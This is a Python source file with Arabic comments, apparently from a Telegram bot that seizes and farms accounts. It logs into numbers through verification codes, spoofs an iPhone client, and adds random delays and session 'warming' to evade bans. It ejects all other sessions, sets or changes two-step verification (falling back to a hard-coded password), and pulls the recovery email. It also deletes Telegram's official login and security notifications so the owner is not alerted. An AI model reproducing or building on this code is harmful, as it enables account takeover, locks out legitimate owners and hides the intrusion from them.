import asyncio
import os
from telethon import TelegramClient, functions, types
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PasswordHashInvalidError, PhoneCodeExpiredError
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest, GetPasswordRequest, UpdatePasswordSettingsRequest
from telethon import password as telethon_password
from config import API_ID, API_HASH, SESSIONS_DIR
from DivoSource.logger import logger
from DivoSource.database import add_account
from DivoSource.antiban import delay_random
from DivoSource.utils import parse_proxy

# تخزين Client المؤقت أثناء عملية تسجيل الدخول
_auth_clients = {}

# أقفال لكل رقم لمنع الوصول المتزامن للجلسة
_phone_locks = {}

def get_phone_lock(phone: str):
    if phone not in _phone_locks:
        _phone_locks[phone] = asyncio.Lock()
    return _phone_locks[phone]

async def advanced_clear_sessions(client: TelegramClient, phone: str, force_kick: bool = False):
    """محاولة طرد الجلسات الأخرى بطريقة متقدمة جداً مع عملية تدفئة للجلسة"""
    try:
        # --- مرحلة التدفئة (Warming up) لتبدو الجلسة حقيقية ---
        try:
            # 1. تحديث الحالة ليكون "متصل الآن"
            await client(functions.account.UpdateStatusRequest(offline=False))
            # 2. طلب إعدادات التليجرام (حركة يقوم بها التطبيق الرسمي دائماً)
            await client(functions.help.GetConfigRequest())
            # 4. تحميل بعض المحادثات لمحاكاة نشاط المستخدم (بدون إرسال رسائل للمحفوظات)
            await client(functions.messages.GetDialogsRequest(
                offset_date=None, offset_id=0, offset_peer=types.InputPeerEmpty(), limit=5, hash=0
            ))
            
            logger.info(f"تمت عملية تدفئة الجلسة للحساب {phone}")
            await asyncio.sleep(10) 
        except Exception as warm_err:
            logger.warning(f"فشلت عملية التدفئة لـ {phone}: {warm_err}")

        # التحقق إذا كان المطلوب هو الطرد أيضاً أم التدفئة فقط
        if not force_kick:
            logger.info(f"تم تخطي طرد الجلسات لـ {phone} (التدفئة فقط)")
            return True, "✅ تمت عملية التدفئة بنجاح (بدون طرد)"

        # 1. محاولة الطرد الجماعي أولاً
        try:
            await client(ResetAuthorizationsRequest())
            logger.info(f"نجح الطرد الجماعي لـ {phone}")
            return True, "✅ تم إنهاء جميع الجلسات الأخرى بنجاح (طرد جماعي رسمي)"
        except Exception as e:
            if "FRESH_RESET_AUTHORISATION_FORBIDDEN" not in str(e):
                 logger.warning(f"فشل الطرد الجماعي لـ {phone}: {e}")
            
        # 2. إذا فشل الجماعي، نحاول جلب الجلسات وطردها واحدة تلو الأخرى باستخدام الـ Hash
        authorizations = await client(GetAuthorizationsRequest())
        kicked_count = 0
        for auth in authorizations.authorizations:
            if not auth.current:
                try:
                    await client(ResetAuthorizationRequest(hash=auth.hash))
                    kicked_count += 1
                    await asyncio.sleep(1) # تأخير بسيط بين كل حذف
                except Exception:
                    continue
        
        if kicked_count > 0:
            logger.info(f"تم طرد {kicked_count} جلسة بشكل فردي لـ {phone}")
            return True, f"✅ تم طرد {kicked_count} جلسة بنجاح (نظام متقدم)"
            
        return False, "⚠️ تيلجرام يمنع طرد الجلسات حالياً (Fresh Session). يرجى المحاولة يدوياً بعد 24 ساعة عبر زر 'تفريغ الجلسات'."
    except Exception as e:
        logger.error(f"خطأ في نظام الطرد المتقدم لـ {phone}: {e}")
        return False, str(e)

async def setup_2fa(client: TelegramClient, new_password: str, current_password: str = None):
    """تفعيل التحقق بخطوتين للحساب أو تغييره"""
    try:
        # إذا كان الباسوورد الجديد هو نفسه الحالي، لا داعي للتغيير
        if current_password == new_password:
            logger.info(f"الحساب {client.phone} لديه نفس الباسوورد المطلوب بالفعل.")
            return True

        # استخدام وظيفة Telethon المدمجة فهي أكثر استقراراً
        await client.edit_2fa(
            current_password=current_password,
            new_password=new_password,
            hint="Divo"
        )
        
        logger.info(f"✅ تم إعداد التحقق بخطوتين بنجاح للحساب {client.phone}")
        await asyncio.sleep(2)
        await clean_service_messages(client)
        return True
    except Exception as e:
        # إذا فشل التغيير وكان الباسوورد موجوداً بالفعل، فقد يكون السبب هو أننا لا نملك الباسوورد الصحيح
        if "password" in str(e).lower() and current_password is not None:
             logger.warning(f"⚠️ تعذر تغيير الباسوورد للحساب {client.phone} (الباسوورد الحالي غير صحيح)")
        else:
             logger.error(f"❌ فشل إعداد التحقق لـ {client.phone}: {e}")
        return False

async def get_account_email(client: TelegramClient, password: str = None, login_email: bool = False):
    """جلب البريد الإلكتروني المرتبط (الاسترداد أو تسجيل الدخول)"""
    try:
        pwd = await client(functions.account.GetPasswordRequest())
        if login_email:
            return pwd.login_email_pattern or "N/A"
            
        if password and not pwd.email_unconfirmed_pattern:
            try:
                password_hash = telethon_password.compute_check(pwd, password)
                settings = await client(functions.account.GetPasswordSettingsRequest(password=password_hash))
                return settings.email or "N/A"
            except Exception:
                pass
        
        return pwd.email_unconfirmed_pattern or "N/A"
    except Exception as e:
        logger.error(f"Error getting email for {client.phone}: {e}")
        return "N/A"

async def clean_service_messages(client: TelegramClient):
    """حذف رسائل الخدمة (الدخول، الكود، الـ 2FA) بأقصى قوة ممكنة"""
    try:
        from telethon.tl.functions.messages import DeleteHistoryRequest, DeleteMessagesRequest
        telegram_id = 777000
        
        # 1. جلب وحذف كل الرسائل الموجودة حالياً بالـ ID (أضمن طريقة)
        try:
            ids = []
            async for msg in client.iter_messages(telegram_id, limit=20):
                ids.append(msg.id)
            if ids:
                await client(DeleteMessagesRequest(id=ids, revoke=True))
        except Exception: pass

        # 2. مسح السجل بالكامل
        try:
            await client(DeleteHistoryRequest(peer=telegram_id, max_id=0, just_clear=False, revoke=True))
        except Exception: pass

        # 3. حذف الديالوج نفسه
        try:
            async for dialog in client.iter_dialogs():
                if dialog.id == 777000 or (dialog.name and "Telegram" in dialog.name):
                    await client.delete_dialog(dialog, revoke=True)
                    break
        except Exception: pass
                    
        return True
    except Exception as e:
        logger.error(f"Error in clean_service_messages for {client.phone}: {e}")
        return False

def fix_session_schema(path):
    """إصلاح مخطط قاعدة بيانات الجلسة إذا كان يحتوي على أعمدة إضافية تسبب خطأ في Telethon"""
    import sqlite3
    if not os.path.exists(path):
        return
    try:
        conn = sqlite3.connect(path)
        cur = conn.cursor()
        cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='sessions'")
        if not cur.fetchone():
            conn.close()
            return
        cur.execute("PRAGMA table_info(sessions)")
        columns = [col[1] for col in cur.fetchall()]
        if len(columns) > 5:
            required = ['dc_id', 'server_address', 'port', 'auth_key', 'takeout_id']
            if all(c in columns for c in required):
                cur.execute("BEGIN TRANSACTION")
                try:
                    cur.execute("CREATE TABLE sessions_new (dc_id integer primary key, server_address text, port integer, auth_key blob, takeout_id integer)")
                    cur.execute("INSERT INTO sessions_new (dc_id, server_address, port, auth_key, takeout_id) SELECT dc_id, server_address, port, auth_key, takeout_id FROM sessions")
                    cur.execute("DROP TABLE sessions")
                    cur.execute("ALTER TABLE sessions_new RENAME TO sessions")
                    conn.commit()
                except Exception:
                    conn.rollback()
        conn.close()
    except Exception:
        pass

async def get_client(phone: str, session_name: str, proxy_url: str = None) -> TelegramClient:

    """تجهيز وإرجاع كائن TelegramClient مع استخدام إعداداتك وبيانات الـ iPhone لزيادة الموثوقية"""
    session_path = os.path.join(SESSIONS_DIR, session_name)
    if not session_path.endswith('.session'):
        session_path += '.session'
    
    # إصلاح الجلسة قبل محاولة فتحها بواسطة Telethon
    fix_session_schema(session_path)
    
    proxy_dict = parse_proxy(proxy_url) if proxy_url else None
    
    # محاكاة جهاز iPhone 17 Pro Max لزيادة الموثوقية وتقليل الحظر
    client = TelegramClient(
        session_path, 
        API_ID, 
        API_HASH, 
        proxy=proxy_dict,
        device_model="iPhone 17 Pro Max",
        system_version="iOS 18.2",
        app_version="11.3.0",
        lang_code="ar",
        system_lang_code="ar-AE"
    )
    client.phone = phone
    return client

async def send_code(phone: str):
    """إرسال كود التحقق للرقم"""
    session_name = f"session_{phone.replace('+', '')}"
    client = await get_client(phone, session_name)
    await client.connect()
    
    _auth_clients[phone] = client
    
    if not await client.is_user_authorized():
        try:
            sent_code = await client.send_code_request(phone)
            logger.info(f"تم إرسال كود التحقق إلى {phone}")
            # حفظ الهاش لاستخدامه لاحقاً في تغيير البريد
            _auth_clients[f"{phone}_hash"] = sent_code.phone_code_hash
            return True, session_name
        except Exception as e:
            logger.error(f"خطأ أثناء إرسال الكود لـ {phone}: {e}")
            await client.disconnect()
            if phone in _auth_clients: del _auth_clients[phone]
            return False, str(e)
    else:
        await client.disconnect()
        if phone in _auth_clients: del _auth_clients[phone]
        return False, "مسجل دخوله مسبقاً"

async def verify_code(phone: str, code: str, password: str = None, user_id: int = None):
    """التحقق من الكود المدخل وإكمال تسجيل الدخول"""
    client = _auth_clients.get(phone)
    if not client:
        return False, "لم يتم العثور على جلسة، أعد المحاولة."
    
    try:
        await delay_random() # تأخير للحماية

        if password:
            await client.sign_in(password=password)
        else:
            await client.sign_in(phone, code)
            
        # إضافة الحساب للقاعدة فوراً
        session_name = f"session_{phone.replace('+', '')}"
        await add_account(phone, session_name, twofa_password=password or "MR_Divo@2004a", added_by=str(user_id) if user_id else None)
        
        await client.disconnect()
        phone_hash = _auth_clients.get(f"{phone}_hash")
        if phone in _auth_clients: del _auth_clients[phone]
        if f"{phone}_hash" in _auth_clients: del _auth_clients[f"{phone}_hash"]
        
        return True, {"message": "تم تسجيل الدخول بنجاح", "phone_hash": phone_hash, "password": password}
    except SessionPasswordNeededError:
         return False, "password_needed"
    except PhoneCodeInvalidError:
         return False, "⚠️ الكود المدخل غير صحيح، يرجى التأكد منه وإعادة إدخاله."
    except PhoneCodeExpiredError:
         return False, "⏰ انتهت صلاحية الكود، يرجى طلب كود جديد."
    except Exception as e:
         logger.error(f"خطأ أثناء التحقق: {e}")
         try:
             await client.disconnect()
             if phone in _auth_clients:
                 del _auth_clients[phone]
         except Exception:
             pass
         return False, f"❌ حدث خطأ: {str(e)}"
